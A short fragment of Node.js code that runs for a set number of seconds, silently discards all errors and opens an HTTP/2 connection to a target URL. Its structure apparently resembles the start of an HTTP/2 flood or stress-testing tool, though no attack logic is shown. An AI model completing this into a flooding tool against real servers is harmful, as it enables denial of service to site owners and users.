const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
const client = http2.connect(parsed.href, clientOptions, function() {});